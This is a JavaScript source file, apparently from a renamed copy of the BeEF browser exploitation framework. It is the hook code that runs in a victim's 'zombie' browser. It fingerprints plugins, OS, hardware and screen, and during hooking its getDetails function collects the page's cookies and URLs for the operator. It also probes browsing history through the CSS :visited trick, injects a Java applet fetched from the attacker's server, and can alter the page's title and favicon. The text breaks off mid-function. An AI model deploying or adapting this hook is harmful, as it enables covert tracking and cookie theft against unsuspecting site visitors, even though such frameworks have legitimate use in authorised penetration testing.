                        Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
                        if (Flash) {
                            flash_installed = true;
                        }
                    }
                    catch (e) {
                    
                    }
                }
            }
            return flash_installed;
        }
    },
	/**
	*  get the flesh version
	*   @return: {String} of the flash version
	*    
	**/
	flashVersion:function(){
		var f="",n=navigator;
		if (n.plugins && n.plugins.length) {
			for (var ii=0;ii<n.plugins.length;ii++) {
				if (n.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {
					f=n.plugins[ii].description.split('Shockwave Flash ')[1];
					break;
				}
			}
		}
		else
		if (window.ActiveXObject) {
			for (var ii=20;ii>=2;ii--) {
				try {
					var fl=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');");
					if (fl) {
						f=ii + '.0';
						break;
					}
				}
				 catch(e) {}
			}
		}
		return f;
	},
    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( rat.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime:function () {

        var quicktime = false;

        // Not Internet Explorer
        if (!this.type().IE) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    quicktime = true;
                }

            }

        // Internet Explorer
        } else {

            try {

                var qt_test = new ActiveXObject('QuickTime.QuickTime');

            } catch (e) {
             
            }

            if (qt_test) {
                quicktime = true;
            }

        }

        return quicktime;

    },

    /**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( rat.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer:function () {

        var realplayer = false;

        // Not Internet Explorer
        if (!this.type().IE) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
                    realplayer = true;
                }

            }

        // Internet Explorer
        } else {

            var definedControls = [
              'RealPlayer',
              'rmocx.RealPlayer G2 Control',
              'rmocx.RealPlayer G2 Control.1',
              'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
              'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
            ];

            for (var i = 0; i < definedControls.length; i++) {

            	try {
                    var rp_test = new ActiveXObject(definedControls[i]);
            	} catch (e) {
                   
            	}

                if ( rp_test ) {
                    realplayer = true;
            	
                }
            }
        }

        return realplayer;

    },

	/**
	 * Checks if the zombie has the Windows Media Player plugin installed.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if ( rat.browser.hasWMP() ) { ... }
	 */
	hasWMP:function () {

	    var wmp = false;

	    // Not Internet Explorer
	    if (!this.type().IE) {

	        for (i = 0; i < navigator.plugins.length; i++) {

	            if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
	                wmp = true;
	            }

	        }

	    // Internet Explorer
	    } else {

	        try {

	            var wmp_test = new ActiveXObject('WMPlayer.OCX');

	        } catch (e) {
                  
	        }

	        if (wmp_test) {
	            wmp = true;
	        }

	    }

	    return wmp;

	},

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC:function() {
        var vlc = false ;
        if(!this.type().IE) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
                    vlc = true;
                }
            }
        } else {
            try {
                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
                vlc = true ;
            } catch(e) {
                   
            }
        }
        return vlc;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.javaEnabled()) { ... }
     */
    javaEnabled:function () {
       return rat.browser.hasJava();
    },

    /**
     * Checks if the Phonegap API is available from the hooked domain.
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.hasPhonegap()) { ... }
     */
    hasPhonegap:function () {
        var result = false;
        
        try {
            if (!!device.phonegap || !!device.cordova) result = true; else result = false;
        }
        catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.hasCors()) { ... }
     */
    hasCors:function () {
        if ('withCredentials' in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.hasJava()) { ... }
     */
    hasJava:function () {

        // Check if Java is enabled

        // This is a temporary fix as this does not work on Safari and Chrome
        // Chrome requires manual user intervention even with unsigned applets.
        // Safari requires a few seconds to load the applet.
        if (rat.browser.isC() || rat.browser.isS()) {
            return true;
        }

        // Inject an unsigned java applet to double check if the Java
        // plugin is working fine.
        try {
            var applet_archive = 'http://' + rat.net.config.host + ':' + rat.net.config.port + rat.net.config.api_path+ '/checkJava.jar';
            var applet_id = 'checkJava';
            var applet_name = 'checkJava';
            var output;
            rat.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'checkJava',
                null, applet_archive, null);
            output = document.Microsoft_Corporation.getInfo();
            rat.dom.detachApplet('checkJava');
            return output = 1;
        } catch (e) {
            return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.hasVBScript()) { ... }
     */
    hasVBScript:function () {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins:function () {

        var results;
        Array.prototype.unique = function () {
            var o = {}, i, l = this.length, r = [];
            for (i = 0; i < l; i += 1) o[this[i]] = this[i];
            for (i in o) r.push(o[i]);
            return r;
        };

        // Internet Explorer
        if (this.isIE()) this.getPluginsIE();

        // All other browsers that support navigator.plugins
        else if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (rat.browser.isFF()) results[i] = escape(navigator.plugins[i].name) + '-v.' + escape(navigator.plugins[i].version);

                // Webkit and Presto (Opera)
                // Don't support the version attribute
                // Sometimes store the version in description (Real, Adobe)
                else results[i] = escape(navigator.plugins[i].name);// + '-desc.' + navigator.plugins[i].description;
            }
            results = results.unique().toString();

            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat':{
                    'control':'Adobe Acrobat',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;

                        }
                        catch (e) {
                        }


                    }},
                'Flash':{
                    'control':'Shockwave Flash',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version; //+ " description "+ filename;
                        }

                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin_Accelerator':{
                    'control':'Google Talk Plugin Video Accelerator',
                    'return':function (control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin':{
                    'control':'Google Talk Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Facebook_Video_Calling_Plugin':{
                    'control':'Facebook Video Calling Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Update':{
                    'control':'Google Update',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Windows_Activation_Technologies':{
                    'control':'Windows Activation Technologies',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }

                    }},
                'VLC_Web_Plugin':{
                    'control':'VLC Web Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Earth_Plugin':{
                    'control':'Google Earth Plugin',

                    'return':function (control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Silverlight_Plug-In':{
                    'control':'Silverlight Plug-In',
                    'return':function (control) {
                        try {
                            version = navigator.plugins['Silverlight Plug-In']["description"];
                            return 'Silverlight Plug-In Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'FoxitReader_Plugin':{
                    'control':'FoxitReader Plugin',
                    'return':function (control) {
                        try {
                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
                            return 'FoxitReader Plugin Version ' + version;
                        } catch (e) {
                        }
                    }}
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                }
                catch (e) {
                }

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE:function () {
        var results = '';
        var plugins = {'AdobePDF6':{
            'control':'PDF.PdfCtrl',
            'return':function (control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v' + parseFloat(version[1]);
            }},
            'AdobePDF7':{
                'control':'AcroPDF.PDF',
                'return':function (control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }},
            'Flash':{
                'control':'ShockwaveFlash.ShockwaveFlash',
                'return':function (control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }},
            'Quicktime':{
                'control':'QuickTime.QuickTime',
                'return':function (control) {
                    return 'QuickTime Player';
                }},
            'RealPlayer':{
                'control':'RealPlayer',
                'return':function (control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }},
            'Shockwave':{
                'control':'SWCtl.SWCtl',
                'return':function (control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }},
            'WindowsMediaPlayer':{
                'control':'WMPlayer.OCX',
                'return':function (control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }},
            'FoxitReaderPlugin':{
                'control':'FoxitReader.FoxitReaderCtl.1',
                'return':function (control) {
                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
                }}
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {
                }
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie screen size and color depth.
     */
    getScreenSize:function () {
        return {
            width:window.screen.width,
            height:window.screen.height,
            colordepth:window.screen.colorDepth
        }
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize:function () {
        var myWidth = 0, myHeight = 0;
        if (typeof( window.innerWidth ) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width:myWidth,
            height:myHeight
        }
    },
	
    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails:function () {
        var details = new Array();

        var browser_reported_name = escape(rat.browser.getBrowserReportedName());
        var page_title       = (document.title) ? escape(document.title) : "Unknown";
        var page_uri         = (document.location.href) ? escape(document.location.href) : "Unknown";
        var page_referrer    = (document.referrer) ? escape(document.referrer) : "Unknown";
		var top_location  = (top.location.href) ? top.location.href : "Unknown";
        var hostname         = (document.location.hostname) ? escape(document.location.hostname) : "Unknown";
        var hostport         = (document.location.port) ? document.location.port : "80";
        var browser_plugins  = rat.browser.getPlugins();
        var date_stamp       = escape(new Date().toString());
        var os_name          = escape(rat.os.getName());
        var hw_name          = rat.hardware.getName();
        var cpu_type         = rat.hardware.cpuType();
        var touch_enabled    = (rat.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
        var browser_type =  rat.browser.type();
        var screen_size      = rat.browser.getScreenSize();
        var window_size      = rat.browser.getWindowSize();
        var java_enabled     = (rat.browser.javaEnabled()) ?     "Yes" : "No";
        var vbscript_enabled = (rat.browser.hasVBScript()) ?     "Yes" : "No";
        var flash_version        = rat.browser.flashVersion();
        var has_phonegap     = (rat.browser.hasPhonegap()) ?     "Yes" : "No";
        var has_googlegears  = (rat.browser.hasGoogleGears()) ?  "Yes" : "No";
        var has_web_socket   = (rat.browser.hasWebSocket()) ?    "Yes" : "No";
        var has_webrtc       = (rat.browser.hasWebRTC()) ?       "Yes" : "No";
        var has_activex      = (rat.browser.hasActiveX()) ?      "Yes" : "No";
        var has_silverlight  = (rat.browser.hasSilverlight()) ?  "Yes" : "No";
        var has_quicktime    = (rat.browser.hasQuickTime()) ?    "Yes" : "No";
        var has_realplayer   = (rat.browser.hasRealPlayer()) ?   "Yes" : "No";
        var has_wmp          = (rat.browser.hasWMP()) ?          "Yes" : "No"; 
        var has_vlc          = (rat.browser.hasVLC()) ?          "Yes" : "No";
        var has_foxit        = (rat.browser.hasFoxit()) ?        "Yes" : "No";
        try{
            var cookies = escape(document.cookie);
            var has_session_cookies = (rat.browser.cookie.hasSessionCookies("cookie")) ? "Yes" : "No";
            var has_persistent_cookies = (rat.browser.cookie.hasPersistentCookies("cookie")) ? "Yes" : "No";
            if (cookies) details['Cookies'] = cookies;
            if (has_session_cookies) details['hasSessionCookies'] = has_session_cookies;
            if (has_persistent_cookies) details['hasPersistentCookies'] = has_persistent_cookies;
        }catch(e){
            // the hooked domain is using HttpOnly. EverCookie is persisting the rat hook in a different way,
            // and there is no reason to read cookies at this point
            details['Cookies'] = "Cookies can not be read. The hooked domain is most probably using HttpOnly.";
            details['hasSessionCookies'] = "No";
            details['hasPersistentCookies'] = "No";
        }

        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
        if (page_title) details['PageTitle'] = page_title;
        if (page_uri) details['PageURI'] = page_uri;
        if (page_referrer) details['PageReferrer'] = page_referrer;
		if (top_location) details['TopLocation'] = top_location;
        if (hostname) details['HostName'] = hostname;
        if (hostport) details['HostPort'] = hostport;
        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
        if (os_name) details['OsName'] = os_name;
        if (hw_name) details['Hardware'] = hw_name;
        if (cpu_type) details['CPU'] = cpu_type;
        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
        if (date_stamp) details['DateStamp'] = date_stamp;
        if (browser_platform) details['BrowserPlatform'] = browser_platform;
        if (browser_type) details['BrowserType'] = browser_type;
        if (screen_size) details['ScreenSize'] = screen_size;
        if (window_size) details['WindowSize'] = window_size;
        if (java_enabled) details['JavaEnabled'] = java_enabled;
        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
		if (flash_version) details['FlashVersion'] = flash_version;
        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
        if (has_activex) details['HasActiveX'] = has_activex;
        if (has_silverlight) details['HasSilverlight'] = has_silverlight;
        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
        if (has_wmp) details['HasWMP'] = has_wmp;
        if (has_vlc) details['HasVLC'] = has_vlc;
        if (has_foxit) details['HasFoxit'] = has_foxit;
			
        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX:function () {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports WebRTC
     */
    hasWebRTC:function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight:function () {
        var result = false;

        try {
            if (rat.browser.isIE()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited:function (urls) {
        var results = new Array();
        var iframe = rat.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');

        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({'url':u, 'visited':success});
                count++;
            }
        }
        rat.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket:function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears:function () {
        var ggfactory = null;
        // Chrome
        if (window.google && google.gears) return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined')
                    && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
                }
            }
        }
        if (!ggfactory) return false; else return true;
    },

    /**
     * Checks if the zombie has Foxit PDF reader plugin.
     * @return: {Boolean} true or false.
     *
     * @example: if(rat.browser.hasFoxit()) { ... }
     * */
    hasFoxit:function () {

        var foxitplugin = false;

        try {
            if (rat.browser.isIE()) {
                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                foxitplugin = true;
            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
                foxitplugin = true;
            }
        } catch (e) {
            foxitplugin = false;
        }

        return foxitplugin;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon:function (favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
            oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC()) iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle:function (title) {
        document.title = title;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per domain, or globally on all domains.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     *
     *    example usage:
     *        $.when(getMaxConnections()).done(function(){
     *            console.debug("Max Connections: " + this);
     *            });
     *
     */
    getMaxConnections:function (scope) {

        var imagesCount = 30;		// Max number of images to test
        var secondsTimeout = 5;		// Image load timeout threashold
        var testUrl = "";		// The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&random=";
        else
        // The token will be replaced by a different number with each request(different domain).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&random=";


        var imagesLoaded = 0;			// Number of responding images before timeout.
        var imagesRequested = 0;		// Number of requested images.
        var testImages = new Array();		// Array of all images.
        var deferredObject = $.Deferred();	// A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] =
                $.ajax({
                    type:"get",
                    dataType:true,
                    url:(testUrl.replace("<token>", i)) + Math.random(),
                    data:"",
                    timeout:(secondsTimeout * 1000),

                    // Function on completion of request.
                    complete:function (jqXHR, textStatus) {

                        imagesRequested++;

                        // If the image returns a 200 or a 302, the text Status is "error", else null
                        if (textStatus == "error") {
                            imagesLoaded++;
                        }

                        // If all images requested
                        if (imagesRequested >= imagesCount) {
                            // resolve the deferred object passing the number of loaded images.
                            deferredObject.resolveWith(imagesLoaded);
                        }
                    }
                });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }
};


rat.regCmp('rat.browser');

rat.browser.cookie = {
	
		setCookie: function (name, value, expires, path, domain, secure) 
		{
	
			var today = new Date();
			today.setTime( today.getTime() );
	
			if ( expires )
			{
				expires = expires * 1000 * 60 * 60 * 24;
			}
			var expires_date = new Date( today.getTime() + (expires) );
	
			document.cookie = name + "=" +escape( value ) +
				( ( expires ) ? ";expires=" + expires_date.toGMTString() : "" ) +
				( ( path ) ? ";path=" + path : "" ) +
				( ( domain ) ? ";domain=" + domain : "" ) +
				( ( secure ) ? ";secure" : "" );
		},

		getCookie: function(name) 
		{
			var a_all_cookies = document.cookie.split( ';' );
			var a_temp_cookie = '';
			var cookie_name = '';
			var cookie_value = '';
			var b_cookie_found = false;
			
			for ( i = 0; i < a_all_cookies.length; i++ )
			{
				a_temp_cookie = a_all_cookies[i].split( '=' );
				cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
				if ( cookie_name == name )
				{
					b_cookie_found = true;
					if ( a_temp_cookie.length > 1 )
					{
						cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
					}
					return cookie_value;
					break;
				}
				a_temp_cookie = null;
				cookie_name = '';
			}
			if ( !b_cookie_found )
			{
				return null;
			}
		},

		deleteCookie: function (name, path, domain) 
		{
			if ( this.getCookie(name) ) document.cookie = name + "=" +
			( ( path ) ? ";path=" + path : "") +
			( ( domain ) ? ";domain=" + domain : "" ) +
			";expires=Thu, 01-Jan-1970 00:00:01 GMT";
		},
		
		hasSessionCookies: function (name)
		{
			var name = name || "cookie";
			if (name == "") name = "cookie";
			this.setCookie( name, 'none', '', '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		},

		hasPersistentCookies: function (name)
		{
			var name = name || "cookie";
			if (name == "") name = "cookie";
			this.setCookie( name, 'none', 1, '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		}	
					
};

rat.regCmp('rat.browser.cookie');

//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662

rat.encode = {};

rat.encode.base64 = {
	
	keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    encode : function (input) {
        if (window.btoa) {
           return btoa(unescape(encodeURIComponent(input)));
        }

        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = rat.encode.base64.utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
            this.keyStr.charAt(enc1) + this.keyStr.charAt(enc2) +
            this.keyStr.charAt(enc3) + this.keyStr.charAt(enc4);

        }

        return output;
    },
    decode : function (input) {
        if (window.atob) {
            return escape(atob(input));
        }

        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = this.keyStr.indexOf(input.charAt(i++));
            enc2 = this.keyStr.indexOf(input.charAt(i++));
            enc3 = this.keyStr.indexOf(input.charAt(i++));
            enc4 = this.keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = rat.encode.base64.utf8_decode(output);

        return output;

    },

   utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";

        for (var n = 0; n < string.length; n++) {

            var c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

    utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;

        while ( i < utftext.length ) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }

        return string;
    }

};

rat.regCmp('rat.encode.base64');


//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Json code from Brantlye Harris-- http://code.google.com/p/jquery-json/

rat.encode.json = {
	
	stringify: function(o) {
        if (typeof(JSON) == 'object' && JSON.stringify) {
            // Error on stringifying cylcic structures caused polling to die
            try {
                s = JSON.stringify(o);    
            } catch(error) {
                // TODO log error / handle cyclic structures? 
            }
            return s;
        }
        var type = typeof(o);
    
        if (o === null)
            return "null";
    
        if (type == "undefined")
            return '\"\"';
        
        if (type == "number" || type == "boolean")
            return o + "";
    
        if (type == "string")
            return $.quoteString(o);
    
        if (type == 'object')
        {
            if (typeof o.toJSON == "function") 
                return $.toJSON( o.toJSON() );
            
            if (o.constructor === Date)
            {
                var month = o.getUTCMonth() + 1;
                if (month < 10) month = '0' + month;

                var day = o.getUTCDate();
                if (day < 10) day = '0' + day;

                var year = o.getUTCFullYear();
                
                var hours = o.getUTCHours();
                if (hours < 10) hours = '0' + hours;
                
                var minutes = o.getUTCMinutes();
                if (minutes < 10) minutes = '0' + minutes;
                
                var seconds = o.getUTCSeconds();
                if (seconds < 10) seconds = '0' + seconds;
                
                var milli = o.getUTCMilliseconds();
                if (milli < 100) milli = '0' + milli;
                if (milli < 10) milli = '0' + milli;

                return '"' + year + '-' + month + '-' + day + 'T' +
                             hours + ':' + minutes + ':' + seconds + 
                             '.' + milli + 'Z"'; 
            }

            if (o.constructor === Array) 
            {
                var ret = [];
                for (var i = 0; i < o.length; i++)
                    ret.push( $.toJSON(o[i]) || "null" );

                return "[" + ret.join(",") + "]";
            }
        
            var pairs = [];
            for (var k in o) {
                var name;
                var type = typeof k;

                if (type == "number")
                    name = '"' + k + '"';
                else if (type == "string")
                    name = $.quoteString(k);
                else
                    continue;  //skip non-string or number keys
            
